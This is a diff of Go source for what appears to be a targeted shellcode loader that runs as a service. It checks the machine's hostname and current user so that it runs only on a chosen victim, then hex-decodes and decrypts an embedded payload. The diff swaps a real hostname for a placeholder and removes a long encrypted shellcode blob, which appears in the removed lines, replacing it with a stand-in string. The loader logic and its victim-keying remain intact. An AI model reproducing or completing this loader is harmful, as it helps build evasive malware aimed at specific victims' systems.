@@ -63,7 +63,7 @@ func isTarget() bool {
 	if err != nil {
 		return false
 	}
-	if hostname != "name" {
+	if hostname != "host name" {
 		return false
 	}
 	cUser, err := user.Current()
@@ -82,16 +82,7 @@ func (p *program) Start(_ service.Service) error {
 	if !isTarget() {
 		return nil
 	}
-	scCipherData := "05cefbcddf0ee680639079e3814ab0a8c547600c75079fc7" +
-		"4e1874a7815bae0fd97b0d929fcf9c5c6246a59bc9959340ed07acd5a5a1" +
-		"6a8bcce33fe2ffd4f5d977f64ecefb4bf0a3f5d2ee390c6580a7e67b8df3" +
-		"e7892598866b65015d8cade170428b5320d2f1d38369b9bae230c70b60bb" +
-		"bdaf4d33a79139a548f2252c903ffb0d23bb842258797ef26477be9f8193" +
-		"596dc8cee073f47228eafd37447d4547541cd8890aaf94006b7b03eb72cf" +
-		"78eea86711c0c7b878afd52629b1f5fb139d1b26daf9bdd34a2d997affec" +
-		"2220e94d67ce6b730cfea47990856f94147bb1767ae0e3b0a16d6668af8e" +
-		"a99d884d70dff031a36a36a4279aed68cab835ab0e1939fba3c6ab994d91" +
-		"ced262b28e44df461ddcc0f5bafd83638a1f0fed9b1ed56a"
+	scCipherData := "encrypted shellcode"
 	cipherData, err := hex.DecodeString(scCipherData)
 	if err != nil {
 		return err
